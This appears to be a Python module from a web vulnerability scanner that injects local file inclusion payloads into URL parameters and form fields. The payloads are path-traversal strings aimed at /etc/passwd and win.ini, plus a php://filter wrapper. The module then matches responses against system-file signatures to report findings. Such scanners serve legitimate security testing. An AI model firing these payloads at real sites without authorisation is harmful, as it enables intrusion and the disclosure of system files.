import logging
import urllib.parse
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from scanner_engine.utils import format_http_request, format_http_response

logger = logging.getLogger(__name__)

class LfiScanner:
    def __init__(self, session, on_vuln=None):
        self.session = session
        self.on_vuln = on_vuln
        self.payloads = [
            "../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "../../../../Windows/win.ini",
            "../../../../../../../../Windows/win.ini",
            "C:\\Windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php" 
        ]
        self.signatures = [
            "root:x:0:0",
            "daemon:x:",
            "[extensions]",
            "[fonts]",
            "Standard Jet DB" # common ODBC
        ]
        
    def scan_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
            
        base_url = url.split('?')[0]
        
        for param, values in params.items():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    resp = self.session.get(base_url, params=test_params, timeout=5)
                    if self._analyze(resp, param, payload, url): break
                except:
                    pass

    def scan_form(self, form):
        action = form.get('action') 
        if not action: return
        
        inputs = form.get('inputs', [])
        method = form.get('method', 'GET').upper()
        
        # Only target text/hidden/password fields, skip submitting buttons
        target_inputs = [i for i in inputs if i.get('name') and i.get('type') not in ['submit', 'button', 'image']]
        
        for input_field in target_inputs:
            input_name = input_field.get('name')
            
            for payload in self.payloads:
                # Prep data (safely fill others)
                data = {}
                for i in inputs:
                    if i.get('name'):
                         data[i.get('name')] = '1'
                
                data[input_name] = payload
                
                try:
                    if method == 'POST':
                        resp = self.session.post(action, data=data, timeout=15)
                    else:
                        resp = self.session.get(action, params=data, timeout=15)
                    
                    if self._analyze(resp, input_name, payload, action): break
                except:
                    pass

    def _analyze(self, resp, param, payload, endpoint):
         # Check for LFI signatures (passwd, win.ini)
         for sig in self.signatures:
             if sig in resp.text:
                 self._report_vuln("Local File Inclusion (LFI)", "High", endpoint, param, payload, f"Found system file signature '{sig}'", resp)
                 return True
                 
         # Check for Base64 (PHP wrapper) - basic heuristic
         if "php://filter" in payload and resp.status_code == 200 and len(resp.text) > 20:
             # If we see a long base64 string... harder to detect blindly without decoding.
             # But if it works, usually the page layout changes.
             # We skip for now to avoid FPs.
             pass
             
         return False

    def _report_vuln(self, name, severity, endpoint, param, payload, evidence, response=None):
        vuln = {
             "name": name,
             "severity": severity,
             "endpoint": endpoint,
             "parameter": param,
             "payload": payload,
             "evidence": evidence,
             "owasp_reference": "https://owasp.org/www-project-top-ten/",
             "owasp_reference": "https://owasp.org/www-project-top-ten/",
             "owasp_id": "A01:2021-Broken Access Control",
             "request": format_http_request(response.request) if response else "",
             "response": format_http_response(response) if response else ""
        }
        if self.on_vuln:
            self.on_vuln(vuln)
